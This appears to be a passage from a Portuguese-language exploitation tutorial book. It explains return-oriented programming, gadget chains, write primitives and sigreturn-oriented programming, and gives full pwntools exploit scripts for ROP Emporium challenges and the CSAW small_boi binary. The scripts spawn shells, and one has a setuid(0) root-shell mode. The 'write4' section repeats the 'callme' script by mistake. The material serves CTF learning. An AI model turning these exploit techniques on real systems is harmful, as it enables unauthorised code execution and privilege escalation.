    mov r12 r13         ...
    ret                 AAAAAAAA
                        gadget_1
                        BBBBBBBB &lt;- RSP

As duas instruções serão executadas!

gadget_1:               stack:
    mov rax rbx         AAAAAAAA
    mov r12 r13         ...
    ret     &lt;- RIP      AAAAAAAA
                        gadget_1
                        BBBBBBBB &lt;- RSP

E agora, a funcao retornara para BBBBBBBB, um endereço invalido, gerando uma SEGFAULT
</code></pre>
<p>E caso a instrução seja um  <code>POP</code>? o <code>RSP</code> andaria? Sim, e precisamos levar 
isso em consideração</p>
<pre><code class="language-py">payload = b&quot;A&quot; * 40
payload += gadget_2
payload += b&quot;T&quot; * 8 # RDI
payload += b&quot;Y&quot; * 8 # RBP
payload += b&quot;B&quot; * 8 # RET
</code></pre>
<p>E vamos supor que os registers sao inicializados com <code>OOOOOOOO</code></p>
<pre><code class="language-x86asm">vulnerável:             stack:              
    ...                 AAAAAAAA
    leave               ...
    ret     &lt;- RIP      AAAAAAAA
                        gadget_2 &lt;- RSP
                        TTTTTTTT
                        YYYYYYYY
                        BBBBBBBB


A execução sera redirecionada, e o RSP ira avançar !
Ate aqui foi igual ao anterior!

gadget_2:               stack:              registers:
    pop rdi &lt;- RIP      AAAAAAAA                RDI = OOOOOOOO    
    pop rbp             ...                     RBP = OOOOOOOO
    ret                 AAAAAAAA
                        gadget_2
                        TTTTTTTT &lt;- RSP
                        YYYYYYYY 
                        BBBBBBBB

pop rdi sera executado, salvando o valor no topo da stack em RDI e avançando RSP

gadget_2:               stack:              registers:
    pop rdi             AAAAAAAA                RDI = TTTTTTTT    
    pop rbp &lt;- RIP      ...                     RBP = OOOOOOOO
    ret                 AAAAAAAA
                        gadget_2
                        TTTTTTTT 
                        YYYYYYYY &lt;- RSP
                        BBBBBBBB


pop rbp sera executado, salvando o valor no topo da stack em RBP e avançando RSP

gadget_2:               stack:              registers:
    pop rdi             AAAAAAAA                RDI = TTTTTTTT    
    pop rbp             ...                     RBP = YYYYYYYY
    ret     &lt;- RIP      AAAAAAAA
                        gadget_2
                        TTTTTTTT 
                        YYYYYYYY
                        BBBBBBBB &lt;- RSP

E agora, a funcao retornara para BBBBBBBB, um endereço invalido, gerando uma SEGFAULT
</code></pre>
<h2 id="chains"><a class="header" href="#chains">Chains</a></h2>
<p>E se, ao invés de retornarmos para <code>BBBBBBBB</code>, retornássemos para outro gadget? </p>
<p>Seria tipo uma corrente: </p>
<p>___com um gadget executando e redirecionando para o proximo....</p>
<p>___com um gadget executando e redirecionando para o proximo....</p>
<p>___com um gadget executando e redirecionando para o proximo....</p>
<p>___com um gadget executando e redirecionando para o proximo....</p>
<p>Assim, poderíamos devagarinho reconstruir o nosso shellcode, a partir de partes 
pre-existentes do código!</p>
<p>E como <code>PIE</code> esta desativado, a secao de código do binário NAO tem seu 
endereço randomizado!</p>
<blockquote>
<p>OBS: Voce nao pode usar a secao de código do libc como gadgets, pois ele tem 
o endereço randomizado (ASLR)</p>
</blockquote>
<pre><code class="language-x86asm">gadget_1:
    mov rax rbx
    mov r12 r13
    ret

gadget_2:
    pop rdi
    pop rbp
    ret
</code></pre>
<pre><code class="language-py">payload = b&quot;A&quot; * 40
payload += gadget_1
payload += gadget_2 
payload += b&quot;T&quot; * 8 # RDI
payload += b&quot;Y&quot; * 8 # RBP
payload += gadget_1
payload += gadget_1
payload += gadget_1
payload += gadget_2 
payload += b&quot;T&quot; * 8 # RDI
payload += b&quot;Y&quot; * 8 # RBP
payload += gadget_1
payload += b&quot;B&quot; * 8 # SEGFAULT
</code></pre>
<p>Essa chain em especifico nao faz nada de util, somente demonstrar como chains 
podem ser construidas!</p>
<p>Numa situação real nao teríamos uma <code>SEGFAULT</code> no final, pois ja teríamos uma 
shell antes de chegar a esse ponto!</p>
<h1 id="ferramentas"><a class="header" href="#ferramentas">Ferramentas</a></h1>
<p>Existem múltiplas ferramentas capazes de encontrar gadgets e ate gerar chains 
automaticamente!</p>
<p>Eu recomendo voce testar e ver o que prefere!</p>
<ul>
<li><a href="https://github.com/Boyan-MILANOV/ropium">ropium</a></li>
<li><a href="https://github.com/sashs/Ropper">ropper</a></li>
<li><a href="https://github.com/JonathanSalwan/ROPgadget">ropGadget</a></li>
<li><a href="https://docs.pwntools.com/en/latest/rop.html">O submodulo do pwntools</a></li>
</ul>
<hr />
<p>E enquanto eu pegava os links no github..
eu encontrei esse em rust:
<a href="https://github.com/Ben-Lichtman/ropr/tree/master/src">ropr</a></p>
<p>Que parece ser bem interessante, mas ainda vou testar!</p>
<hr />
<p>Todas as ferramentas possuem funcionalidade de filtrar gadgets com badchars, 
automaticamente gerar chains...</p>
<p>Eu pessoalmente gosto de ropper e do pwntools (pq ter tudo dentro do mesmo 
framework == incrível)</p>
<h1 id="curiosidades"><a class="header" href="#curiosidades">Curiosidades</a></h1>
<p>Em arquiteturas <code>RISC</code>, todas as instruções tem o mesmo tamanho (em bytes)...</p>
<p>Porem em <code>x86</code> (<code>CISC</code>), as instruções podem desde 2 bytes, ate 5/6/7 bytes!</p>
<p>Assim, as ferramentas que encontram gadgets podem criar instruções que 
originalmente nao existiam no programa!</p>
<pre><code>Exemplo (fictício, pq eu to com preguiça ler o manual e ver os bytecodes)

O programa originalmente ve:

12 34   56 78 91    12 34  90
|       |           |      |
Add     Pop         Add    NOP

Porem, a ferramenta pode escolher um offset com alinhamento diferente do anterior:

12      34 56 78    91 12   34 90
|       |           |       |
AND     Sub         Push    XOR

Mesmos bytes, instruções diferentes

</code></pre>
<div style="break-before: page; page-break-before: always;"></div><ul>
<li><a href="stack/rop/primitivos.html#primitivos">Primitivos</a></li>
<li><a href="stack/rop/primitivos.html#classifica%C3%A7%C3%A3o">Classificação</a>
<ul>
<li><a href="stack/rop/primitivos.html#write---what---where">Write - What - Where</a>
<ul>
<li><a href="stack/rop/primitivos.html#exemplo">Exemplo</a></li>
</ul>
</li>
<li><a href="stack/rop/primitivos.html#write---something---where">Write - Something - Where</a></li>
<li><a href="stack/rop/primitivos.html#modificador">Modificador</a></li>
</ul>
</li>
<li><a href="stack/rop/primitivos.html#incomuns">Incomuns</a></li>
<li><a href="stack/rop/primitivos.html#dicas">Dicas</a>
<ul>
<li><a href="stack/rop/primitivos.html#valores-pre-modificados">Valores pre modificados</a></li>
<li><a href="stack/rop/primitivos.html#alinhamento-da-stack">Alinhamento da stack</a></li>
</ul>
</li>
</ul>
<h1 id="primitivos"><a class="header" href="#primitivos">Primitivos</a></h1>
<p>Primitivos sao a base dos exploits modernos, um primitivo pode ser desde uma 
sequencia especifica de gadgets, funções, etcetc.</p>
<p>Normalmente, voce vai adicionar funções aos seus scripts que usem o primitivo, 
acelerando a velocidade de desenvolvimento dos exploits.</p>
<h1 id="classificação-1"><a class="header" href="#classificação-1">Classificação</a></h1>
<h2 id="write---what---where"><a class="header" href="#write---what---where">Write - What - Where</a></h2>
<p>Esse primitivo te permite escrever algo (what) em algum lugar, esse algo pode 
ser desde 1 byte, ate uma qword inteira!</p>
<h3 id="exemplo"><a class="header" href="#exemplo">Exemplo</a></h3>
<p>Uma chain que escreve um byte em um local:</p>
<pre><code class="language-x86asm">gadget_pop_rdi:
    pop rdi
    ret

gadget_pop_rax:
    pop r13
    pop rax
    pop r12
    xor r13 r12
    ret

gadget_mov_rdi_al:
    mov [rdi] al
    pop r14
    ret
</code></pre>
<p>Gadgets normalmente nao sao exatamente o que a gente precisa, então as vezes 
precisamos ocupar a stack com &quot;lixinho&quot; para compensar!</p>
<p>Sim... esse e o nome técnico correto! E nao tem argumento que me va me 
convencer do contrario!</p>
<pre><code class="language-py">def write_byte(what, where);
    temp = b&quot;&quot;                  # Lixo  # Util
    temp += gadget_pop_rdi      
    temp += p64(where)                  # rdi
    temp += gadget_pop_rax      
    temp += b&quot;A&quot;*8              # r13
    temp += p64(what)                   # rax
    temp += b&quot;B&quot;*8              # r12
    temp += gadget_mov_rdi_al           # mov [rdi] al
    temp += b&quot;C&quot;*8              # r14
    
    return temp
</code></pre>
<p>E nos poderíamos usar assim:</p>
<pre><code class="language-py">payload = b'A'*40
data_seg = 0x00601028
for c in b&quot;/bin/sh\x00&quot;:
	payload += write_byte(c, data_seg)
	data_seg += 1

payload += gadget_pop_rdi
payload += p64(0x00601028)    # data_seg inicial: pointer para /bin/sh
payload += p64(libc.sym.system) 
</code></pre>
<h2 id="write---something---where"><a class="header" href="#write---something---where">Write - Something - Where</a></h2>
<p>Voce escreve alguma coisa (voce nao controla) em algum lugar (voce controla)</p>
<p>o <code>mov [rdi] al</code> poderia ser substituído por:
<code>mov [rdi] 0x7f 1e 1f 60 00 00 00 00</code></p>
<p>Assim, podemos escrever esse valor fixo, em um endereço que nos controlamos!</p>
<p>Pode util ser em ROP chains caso voce possua um modificador.</p>
<p>Uma fonte comum desse primitivo sao unlinks parciais no heap (unsorted bins attack)</p>
<h2 id="modificador"><a class="header" href="#modificador">Modificador</a></h2>
<p>add, xor, sub, .... todas essas instruções nos permitem alterar os bytes que 
ja estão na memoria!</p>
<p>E similar aos writes, a quantidade de controle que possuímos pode variar!</p>
<p><code>pop rdx; add [rdx] 0x02;</code> Somente controlamos o endereço!</p>
<p>Caso tenhamos um <code>xor</code>, a situação ideal seria a memoria = <code>0xff</code></p>
<p>Caso seja um <code>add</code>, e a memoria <code>0x00</code>, nos possuímos um write super simples!</p>
<p>E assim por diante!</p>
<h1 id="incomuns"><a class="header" href="#incomuns">Incomuns</a></h1>
<p>Existem outros primitivos que sao mais raros, então somente irei explicar 
quando for util. Por exemplo o <code>write refletido</code>: explicado no 
tutorial de unsafe unlink!</p>
<p>Porem vou colocar os links aqui caso voce esteja procurando por algum especifico! :D</p>
<h1 id="dicas"><a class="header" href="#dicas">Dicas</a></h1>
<h2 id="valores-pre-modificados"><a class="header" href="#valores-pre-modificados">Valores pre modificados</a></h2>
<p>Similar ao lixinho para os <code>pops</code>, e eu nao sabia aonde colocar! hehe :D</p>
<p>As vezes, um gadget muito util acaba tendo efeito colateral nos nossos valores!</p>
<p>Por exemplo, vamos supor que somente exista um gadget que nos permita alterar rdi!</p>
<pre><code class="language-x86asm">gadget_rdi:
    pop rdi
    add rdi 0x1234 
    ret

gadget_pop_rax:
    pop r13
    pop rax
    pop r12
    xor r13 r12
    ret

gadget_mov_rdi_al:
    mov [rdi] al
    pop r14
    ret
</code></pre>
<p>Os outros gadgets estão inalterados!</p>
<pre><code class="language-py">def write_byte(what, where);
    temp = b&quot;&quot;                  # Lixo  # Util
    temp += gadget_pop_rdi


    temp += p64(where - 0x1234)         # rdi
    
    
    temp += gadget_pop_rax      
    temp += b&quot;A&quot;*8              # r13
    temp += p64(what)                   # rax
    temp += b&quot;B&quot;*8              # r12

    temp += b&quot;B&quot;*8              # r12
    temp += gadget_mov_rdi_al           # mov [rdi] al
    temp += b&quot;C&quot;*8              # r14
    
    return temp
</code></pre>
<h2 id="alinhamento-da-stack"><a class="header" href="#alinhamento-da-stack">Alinhamento da stack</a></h2>
<p>Voce precisa garantir o alinhamento da stack de acordo com a arquitetura:</p>
<ul>
<li>x86 -&gt; 4 bytes -&gt; p32()</li>
<li>x86_64 -&gt; 8 bytes -&gt; p64()</li>
</ul>
<p>Mesmo que o valor seja so um byte, voce precisa garantir o alinhamento da 
stack! Pois o <code>pop</code> vai retirar 4 ou 8 bytes independentemente! Assim, 
estragando o endereço do proximo gadget na chain!</p>
<p>Caso o bytes va para <code>al</code>, <code>p64(0x41) </code>ja basta!</p>
<p>Mas caso o valor para <code>al</code> voce precisa fazer <code>p64(0x4100)</code> ou <code>b&quot;\x00&quot;*7 + b&quot;\x41&quot; + b&quot;\x00&quot;</code></p>
<div style="break-before: page; page-break-before: always;"></div><p>Aqui tao minhas solucoes, em breve vou escrever um tutorial, mas por enquanto
e isso :(</p>
<ul>
<li><a href="stack/rop/ROPE/dump.html#sha256">sha256</a></li>
<li><a href="stack/rop/ROPE/dump.html#ret2win">ret2win</a></li>
<li><a href="stack/rop/ROPE/dump.html#split">split</a></li>
<li><a href="stack/rop/ROPE/dump.html#callme">callme</a></li>
<li><a href="stack/rop/ROPE/dump.html#write4">write4</a></li>
<li><a href="stack/rop/ROPE/dump.html#badchars">badchars</a></li>
<li><a href="stack/rop/ROPE/dump.html#fluff">fluff</a></li>
</ul>
<h1 id="sha256"><a class="header" href="#sha256">sha256</a></h1>
<p>E as sha256 pq eu percebi q os desafios foram alterados com o passar do tempo </p>
<pre><code>$ sha256sum 0-ret2win/ret2win 1-split/split 1-split/split 2-callme/callme 3-write4/write4 4-badchars/badchars 5-fluff/fluff

824893a58502620cbfe8bce7d362cf96b5eb484b78291b1371fd7a2b8086c1d6  0-ret2win/ret2win
bf9af5d3618c33c800f577065a4773fb12b6e88390552dd766efa013ebad40f9  1-split/split
bf9af5d3618c33c800f577065a4773fb12b6e88390552dd766efa013ebad40f9  1-split/split
38b3aac5f11e673ecfbe344f9330d7dfa7d6921be506a948ab9d0347af756acb  2-callme/callme
15c9fc1d4dff1874633caebd212d4990243b072f9352baa23daf07f39a93f8cd  3-write4/write4
5308289f3937a34e4c5eac818e394217f5f22c6f21fbb0f6dc6b8e3f771deb8b  4-badchars/badchars
e5335795104d861dc5e54c8734e090f1c7dfd5b642e4607c2747aed7529c724d  5-fluff/fluff
</code></pre>
<h1 id="ret2win"><a class="header" href="#ret2win">ret2win</a></h1>
<pre><code>O programa fala o tamanho ate o RIP (40), e você pode usar o truque mencionado
no enunciado para testar.

Ai é só usar objdump |  grep ret2win para pegar o endereço
	 python3 -c &quot;print('A'*40+'\x56\x07\x40',end='')&quot; |./ret2win 
Truque pra tirar a newline (se não, não funciona)
</code></pre>
<h1 id="split"><a class="header" href="#split">split</a></h1>
<pre><code class="language-py">#!/usr/bin/python3
from pwn import *

	# sys arg on RDI
    # https://godbolt.org/z/691asM

#gadgets
system = p64(0x40074b)
# gdb&gt; print system:  0x400560
# That one is a addr to call_system (usefulFunction)

# ROPgadget or ropium
pop_rdi_ret = p64(0x4007c3)

# strings
# rabin -z   or   r2&gt; iz 
ls = p64(0x0040084a)
cat = p64(0x00601060)

buf = b'A'*40 # Pad
# buf += p64(0x00400742)
# usefulFunction -&gt; test offset
buf += pop_rdi_ret
buf += cat
buf += system

binary = ELF(&quot;./split&quot;)
io = process(binary.path)
io.recvuntil(&quot;&gt; &quot;)
io.sendline(buf)
io.recvuntil(&quot;!\n&quot;)
log.success(io.recvuntil(&quot;}&quot;))
io.close()k
</code></pre>
<h1 id="callme"><a class="header" href="#callme">callme</a></h1>
<pre><code class="language-py">#!/usr/bin/python3
from pwn import *

# Strings
args = p64(0xdeadbeefdeadbeef)
args += p64(0xcafebabecafebabe)
args += p64(0xd00df00dd00df00d)

# Gadgets
useful = p64(0x000000000040093c)
    # pop rdi, rsi, rdx
    # calling convention:
    #    rdi rsi rdx rcx

# Funcs (gdb print)
callone = p64(0x7ffff7dc881a)
calltwo = p64(0x7ffff7dc892b)
callthree = p64(0x7ffff7dc8a2d)

payload = b'A'*40
for func in [callone, calltwo, callthree]:
    payload += useful
    payload += args
    payload += func


binary = ELF(&quot;./callme&quot;)
io = process(binary.path)
io.recvuntil(&quot;&gt; &quot;)
io.sendline(payload)
io.recvuntil(&quot;!\n&quot;)
log.success(io.recv(512))
io.close()
</code></pre>
<h1 id="write4"><a class="header" href="#write4">write4</a></h1>
<pre><code class="language-py">#!/usr/bin/python3
from pwn import *

# Strings
args = p64(0xdeadbeefdeadbeef)
args += p64(0xcafebabecafebabe)
args += p64(0xd00df00dd00df00d)

# Gadgets
useful = p64(0x000000000040093c)
    # pop rdi, rsi, rdx
    # calling convention:
    #    rdi rsi rdx rcx

# Funcs (gdb print)
callone = p64(0x7ffff7dc881a)
calltwo = p64(0x7ffff7dc892b)
callthree = p64(0x7ffff7dc8a2d)

payload = b'A'*40
for func in [callone, calltwo, callthree]:
    payload += useful
    payload += args
    payload += func


binary = ELF(&quot;./callme&quot;)
io = process(binary.path)
io.recvuntil(&quot;&gt; &quot;)
io.sendline(payload)
io.recvuntil(&quot;!\n&quot;)
log.success(io.recv(512))
io.close()
</code></pre>
<h1 id="badchars"><a class="header" href="#badchars">badchars</a></h1>
<pre><code class="language-py">#!/usr/bin/python3
from pwn import *

binary = ELF(&quot;./badchars&quot;)
io = process(binary.path)
io.recvuntil(&quot;&gt; &quot;)

# But on data+6 there is a bad byte on the addr
# Because we wouldnt be able to fix the bad byte if the addr was also bad, we do a +3
# Other solutions:
#       If we had a-&gt; add [REG+123whatever] 123whatever
#       or walking with inc-&gt; REG=data_seg; 6*(inc REG); add [reg] 122whatever
#       maybe ret2csu?

# Gadgets (usefulGadgets + ropper --file badchars -b 7867612e)
write8_r13_r12 = p64(0x0000000000400634)
pop_r12_r13 = p64(0x000000000040069c)  # r12 r13 r14 r15
pop_rdi = p64(0x00000000004006a3)
pop_r14_r15 = p64(0x00000000004006a0)
sub1_r15_r14b = p64(0x0000000000400630)

bad = [ord('x'), ord('g'), ord('a'), ord('.')]
data_seg = 0x00601028 +3

# Funcs
def arbwrite8(addr, val): 
    temp = pop_r12_r13 +val +p64(addr)
    temp += b'B'*16 # fill r14 r15 
    return temp + write8_r13_r12
def arbsub1(addr, val): return pop_r14_r15 +val*8 +p64(addr) +sub1_r15_r14b

# Initial write
payload = b'A'*40
payload += arbwrite8(data_seg, b&quot;\xff/fl\xff\xff\xfft&quot;) # FF as placeholder
payload += arbwrite8(data_seg+8, b&quot;\xfft&quot;+b'\x00'*6)

# Fix bad bytes
payload += arbsub1(data_seg+0, b'\xd1') # .
                                        # /
                                        # f
                                        # l
payload += arbsub1(data_seg+4, b'\x9e') # a
payload += arbsub1(data_seg+5, b'\x98') # g
payload += arbsub1(data_seg+6, b'\xd1') # . # addr contains bad char w/o shift
                                        # t
payload += arbsub1(data_seg+8, b'\x87') # x
                                        # t
# Load pointer and call print_file
payload += pop_rdi
payload += p64(data_seg)
payload += p64(io.elf.plt['print_file'])

io.sendline(payload)
io.recvuntil(&quot;!\n&quot;)
log.success(io.recv(512))
io.close()
</code></pre>
<h1 id="fluff"><a class="header" href="#fluff">fluff</a></h1>
<pre><code class="language-py">#!/usr/bin/python3
from pwn import *

# https://www.felixcloutier.com/x86/xlat:xlatb
# https://www.tutorialspoint.com/assembly_programming/assembly_stos_instruction.htm
# https://www.felixcloutier.com/x86/bextr

binary = ELF(&quot;./fluff&quot;)
io = process(binary.path)
io.recvuntil(&quot;&gt; &quot;)

# Gadgets
bextr_rbx = p64(0x000000000040062a)
	# pop    rdx	
   	# pop    rcx
   	# add    rcx,0x3ef2
   	# bextr  rbx,rcx,rdx

xlat_al_rbx = p64(0x0000000000400628)
# Set AL to memory byte [RBX + unsigned AL].

pop_rdi = p64(0x00000000004006a3)
stosb_rdi_al = p64(0x0000000000400639) 

# funcs
def mov_rbx(val):
	rcx = p64(val - 0x3ef2)
	rdx = p64(0x4000)
	# [0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
	#  |                       |                 |
	#  16    num_bits=64       7  start_bit=0    0
	# bextr will copy 64 bits from rcx, 
	# starting on bit 0. Then save it on rbx
	return bextr_rbx +rdx +rcx

payload = b'A'*40
al = 0xb # al starts = 0xb
data_seg = 0x00601028
for c in b&quot;flag.txt&quot;:
	# Load char to al
	b = next(binary.search(c)) - al
	payload += mov_rbx(b)
	payload += xlat_al_rbx
	al = c

	# Load addr to rdi
	payload += pop_rdi
	payload += p64(data_seg)
	data_seg += 1

	# write
	payload += stosb_rdi_al

payload += pop_rdi
payload += p64(0x00601028)
payload += p64(io.elf.plt['print_file'])

io.sendline(payload)
io.recvuntil(&quot;!\n&quot;)
log.success(io.recv(512))
io.close()
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="pivot"><a class="header" href="#pivot">Pivot</a></h1>
<pre><code>3d3523f651e7730be0c7c2347ab109dd0842dc29cec3d5fe0c868afc6803026c  pivot
8de035bdc097b881c2118c09ce995b78f49019582cfe6e1b3a584dbebe1c3481  libpivot.so
</code></pre>
<pre><code class="language-py">#!/usr/bin/python3
from pwn import *
from time import sleep

# --------------------------------------------------  
# Inicializar
# --------------------------------------------------  
if args.LOG: context.log_level = &quot;info&quot;
else       : context.log_level = &quot;critical&quot;

binary = ELF(&quot;pivot&quot;)
libc = binary.libc

io = process(binary.path)
io.recvuntil(&quot;pivot: &quot;)
leak = int(io.recv(14)[2::],16)
log.info(&quot;Leak: &quot;+hex(leak))

io.recvuntil(&quot;&gt; &quot;)

# --------------------------------------------------  
# Gadgets
# --------------------------------------------------
# Misc
pop_rdi = p64(0x0000000000400a33) 
pop_rax = p64(0x00000000004009bb)
pop_rbp = p64(0x00000000004007c8)
add_rax_rbp = p64(0x00000000004009c4) 
pop_rsi_r15 = p64(0x0000000000400a31) 


# Pivot
xchg_rsp = p64(0x00000000004009bd) # xchg rax, rsp; ret; 

# Read
mov_eax_rax = p64(0x00000000004009c1) # mov eax, dword ptr [rax]; ret;

# Exec
call_rax = p64(0x00000000004006b0) # call rax; depois coloca um lixin p64 
pop_r12_13_14_15 = p64(0x0000000000400a2c) 
one_gadget = 0xcbd1a
# 0xcbd1a execve(&quot;/bin/sh&quot;, r12, r13)
# constraints:
 # [r12] == NULL || r12 == NULL
 # [r13] == NULL || r13 == NULL

# --------------------------------------------------  
# Primeira Fase
# --------------------------------------------------  
fase1 = b&quot;&quot;
fase1 += b&quot;B&quot;*40
fase1 += pop_rax   
fase1 += p64(leak) # leak == fase2
fase1 += xchg_rsp  # rsp == fase2

# Entao, caso coloquemos uma ROP chain no leak, ela sera executada

# --------------------------------------------------  
# Segunda Fase
# --------------------------------------------------  
def get_shell():
	fase2 = b''
	# Ler a got de puts
	fase2 += pop_rax 
	fase2 += p64(binary.got.puts)
	fase2 += mov_eax_rax # mov eax [rax]

	# agora temos o FINAL de puts em rax
	# inicio do puts == ao do leak
	# Entao podemos calcular o resto dele a partir do leak
	# leak  = 0x7fb5       27 4a 9f 10 
	# final = 0x           27 52 45 f0
	# (leak &gt;&gt; 4*8  &lt;&lt; 4*8) + final_puts == puts
	# 0x7fb500000000 + final_puts = 0x7fb5275245f0 (puts)

	# calcular o endereco do one_gadget usando puts como referencia
	fase2 += pop_rbp
	fase2 += p64( (leak &gt;&gt; 4*8 &lt;&lt; 4*8) - (libc.sym.puts - one_gadget) )
	fase2 += add_rax_rbp
	    # lembrete: libc.sym e um  offset dentro do libc (e o one_gadget tambem)

	# one gadget constraints r12 r13 == NULL
	fase2 += pop_r12_13_14_15
	fase2 += p64(0)*4 
	fase2 += call_rax

	return fase2

def privesc():
	setuid = b''
	# Ler a got de puts
	setuid += pop_rax
	setuid += p64(binary.got.puts)
	setuid += mov_eax_rax # mov eax [rax]
	
	# calcular o endereco de setuid usando puts como referencia
	setuid += pop_rbp
	setuid += p64( (leak &gt;&gt; 4*8 &lt;&lt; 4*8) - (libc.sym.puts - libc.sym.setuid) )
	setuid += add_rax_rbp

	setuid += pop_rdi
	setuid += p64(0)
	setuid += call_rax
	setuid += p64(0)

	return setuid

def foothold():
	libpivot = ELF(&quot;libpivot.so&quot;)

	# Executar foothold_function para popular o got
	challenge = b''
	challenge += pop_rax
	challenge += p64(binary.plt.foothold_function)
	challenge += call_rax
	challenge += p64(0)

	# Ler a got de foothold_function
	challenge += pop_rax
	challenge += p64(binary.got.foothold_function)
	challenge += mov_eax_rax # mov eax [rax]
	
	# calcular o endereco de ret2win usando foothold como referencia
	challenge += pop_rbp
	challenge += p64( (leak &gt;&gt; 4*8 &lt;&lt; 4*8) - (libpivot.sym.foothold_function - libpivot.sym.ret2win) )
	challenge += add_rax_rbp

	challenge += call_rax
	challenge += p64(0)

	return challenge

# --------------------------------------------------  
# :D
# --------------------------------------------------  
log.critical('''
ARGV modos:
	SHELL  - shell
	PRIV   - root shell
	CTF    - print flag 

ARGV debug: 
	SLEEP  - 5 seg
	LOG    - log verboso
''')

if args.SLEEP: sleep(5)

if args.CTF:
	fase2 = foothold()
elif args.PRIV:
	fase2 = privesc() + get_shell()
elif args.SHELL:
	fase2 = get_shell()
else:
	log.critical(&quot;Por favor, selecione um modo&quot;)
	quit()

io.sendline(fase2)
io.recvuntil(&quot;&gt; &quot;)

io.sendline(fase1)

if args.CTF:
	io.recvuntil(&quot;libpivot\n&quot;)
	log.critical(io.recv(128))
else:
	io.recvuntil(&quot;!\n&quot;)
	io.interactive()
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="srop"><a class="header" href="#srop">SROP</a></h1>
<ul>
<li><a href="stack/rop/SROP/SROP.html#srop">SROP</a></li>
<li><a href="stack/rop/SROP/SROP.html#teoria">Teoria</a>
<ul>
<li><a href="stack/rop/SROP/SROP.html#processos-e-signals">Processos e Signals</a></li>
<li><a href="stack/rop/SROP/SROP.html#sigreturn">Sigreturn</a></li>
<li><a href="stack/rop/SROP/SROP.html#fake">Fake</a></li>
</ul>
</li>
<li><a href="stack/rop/SROP/SROP.html#exemplo-sem-leaks">Exemplo Sem leaks</a>
<ul>
<li><a href="stack/rop/SROP/SROP.html#download">Download</a></li>
<li><a href="stack/rop/SROP/SROP.html#solu%C3%A7%C3%A3o">Solução</a></li>
</ul>
</li>
<li><a href="stack/rop/SROP/SROP.html#exemplo-com-leaks">Exemplo Com Leaks</a>
<ul>
<li><a href="stack/rop/SROP/SROP.html#sropc">srop.c</a></li>
<li><a href="stack/rop/SROP/SROP.html#exploit">Exploit</a></li>
</ul>
</li>
</ul>
<h1 id="teoria-1"><a class="header" href="#teoria-1">Teoria</a></h1>
<p>Essa técnica que permite voce tornar a stack executável com somente 2 gadgets!</p>
<p>A técnica depende da maneira como sistemas <code>UNIX</code> cuidam dos seus processos!</p>
<p>Caso voce precise de uma revisão em <a href="https://0xturazzi.github.io/book/stack/ret2libc/intro.html#mprotect--ret2shellcode">mprotect + ret2shellcode</a> :D</p>
<h2 id="processos-e-signals"><a class="header" href="#processos-e-signals">Processos e Signals</a></h2>
<h2 id="sigreturn"><a class="header" href="#sigreturn">Sigreturn</a></h2>
<ul>
<li><a href="https://www.tutorialspoint.com/unix_system_calls/sigreturn.htm">tutorialspoint</a></li>
<li><a href="https://man7.org/linux/man-pages/man2/sigreturn.2.html">man sigreturn</a></li>
</ul>
<p>Quando o processo e interrompido, o kernel cria um <code>stack frame</code> 
para o <code>signal handler</code> (independentemente de padrão, ou 
implementado pelo programa)... Semelhantemente a quando ocorre uma 
<code>call</code> !</p>
<p>Assim como em funções (aonde os registers <code>non-scratch</code> precisam 
ser salvos), para criar o <code>signal handler</code> antes precisamos salvar 
o estado atual usando um struct <code>sigreturn context</code> !</p>
<p><img src="stack/rop/SROP/./sigcontext_structure.jpg" alt="sigreturn context diagram" /></p>
<p><img src="https://amriunix.com/img/Sigreturn-oriented-programming-SROP/sigcontext_structure.jpg" alt="" /></p>
<p><a href="https://amriunix.com/img/Sigreturn-oriented-programming-SROP/sigcontext_structure.jpg">Fonte imagem: amriunix</a></p>
<p>Para retornar, o <code>signal handler</code> nao pode usar um simples <code>ret</code>, 
portanto usando a <code>syscall sigreturn</code> (<code>rax</code> = <code>0xf</code>)</p>
<p>A syscall era consumir o <code>sigreturn context</code> e continuar execução 
normalmente!</p>
<p>Pera ai, e se nos criarmos um <code>sigreturn context</code> falso e chamarmos
essa syscall manualmente????? Como se nos fossemos um 
<code>signal handler</code> retornando?????</p>
<h2 id="fake"><a class="header" href="#fake">Fake</a></h2>
<p>Para facilitar a criação desse struct, podemos usar o nosso 
amigo pwntools: <a href="https://docs.pwntools.com/en/dev/rop/srop.html">pwntools SROP</a></p>
<p>Criando um struct vazio, e preenchendo-o!</p>
<pre><code class="language-py">frame = SigreturnFrame(arch=&quot;amd64&quot;)
frame.rax = 0xa
frame.rsi = 0x10
frame.rdx = 1234
frame.rip = 123
</code></pre>
<blockquote>
<p>OBS: O struct e dependente da arquitetura, por exemplo, os 
registers presente num processador ARM sao diferentes de um amd</p>
</blockquote>
<blockquote>
<p>OBS 2: Voce nao coloca p64() nos valores, se nao buga sei la</p>
</blockquote>
<p>Agora, nos somente precisamos de uma chain que chame <code>sigreturn</code></p>
<p>Eu imagino que voce possa chamar o wrapper em libc, mas para 
chamar a syscall basta executar!</p>
<pre><code class="language-x86asm">mov rax, 0xf  ; 15
syscall       ; ou int_80 em 32 bits sei la
</code></pre>
<h1 id="exemplo-sem-leaks"><a class="header" href="#exemplo-sem-leaks">Exemplo Sem leaks</a></h1>
<p>Tabela de syscalls linux: <a href="https://filippo.io/linux-syscall-table/">filippo.io</a></p>
<h2 id="download"><a class="header" href="#download">Download</a></h2>
<p><a href="https://github.com/guyinatuxedo/nightmare/blob/master/modules/16-srop/csaw19_smallboi/small_boi">nightmare: small_boi</a></p>
<h2 id="solução"><a class="header" href="#solução">Solução</a></h2>
<pre><code class="language-py">#!/usr/bin/python3
from pwn import *


elf = ELF(&quot;small_boi&quot;)
io = process(elf.path)

syscall = 0x400180 # mov eax, 0xf; syscall;
                   # +5 = so a syscall

sig = SigreturnFrame(arch='amd64')
sig.rax = 59      # execve
sig.rip = syscall+5
sig.rdi = next(elf.search(b&quot;/bin/sh\x00&quot;))

payload = b'A'*40      # cyclical_find
payload += p64(syscall)
payload += bytes(sig)

io.sendline(payload)
io.interactive()

</code></pre>
<h1 id="exemplo-com-leaks"><a class="header" href="#exemplo-com-leaks">Exemplo Com Leaks</a></h1>
<h2 id="sropc"><a class="header" href="#sropc">srop.c</a></h2>
<ul>
<li><a href="https://amriunix.com/post/sigreturn-oriented-programming-srop/">amriunix</a></li>
<li><a href="https://0x00sec.org/t/srop-signals-you-say/2890">0x00sec</a></li>
</ul>
<pre><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
